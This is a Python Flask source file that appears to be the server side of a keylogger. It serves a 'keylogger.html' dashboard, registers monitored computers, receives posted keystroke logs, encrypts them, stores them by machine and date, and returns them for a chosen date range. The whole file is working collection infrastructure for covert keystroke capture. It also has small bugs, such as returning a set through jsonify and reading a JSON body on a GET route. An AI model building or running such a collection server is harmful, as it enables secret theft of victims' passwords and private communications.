from flask import Flask, jsonify, request, redirect
from flask_cors import CORS
from analyze_files import save_data_with_time, read_text
from Encryption import encryption
from datetime import datetime
import os

app = Flask(__name__)
CORS(app)

computers = [{"name": "nn"}]


@app.route('/')
def index():
    return redirect('/static/Frontend/keylogger.html')


@app.route('/api/computers', methods=['GET'])
def get_computers():
    return jsonify(computers)

@app.route('/api/data', methods=['POST'])
def write_data():
    new_data = request.json
    print(new_data)
    dt = datetime.strptime(new_data["timestamp"],"%Y-%m-%d %H:%M:%S")
    date_only = dt.date()
    data = encryption(new_data["log"])
    print(new_data["log"])
    print(data)
    save_data_with_time(new_data["computer_name"],date_only,data)
    return jsonify({
        "message": "Data saved successfully",
        "file": new_data
    }), 201


@app.route('/api/computers', methods=['POST'])
def add_computer():
    new_computer = request.json
    if any(c["id"] == new_computer["id"] for c in computers):
        return jsonify({"error:this computer exist "}), 400

    computers.append(new_computer)
    return jsonify(new_computer), 201


@app.route('/api/computers/<machine>', methods=['GET'])
def get_data(machine):
    p = request.json
    print(p)
    new_text = read_text(machine,p["f_date"],p["t_date"])
    return new_text


if __name__ == '__main__':
    app.run(debug=True)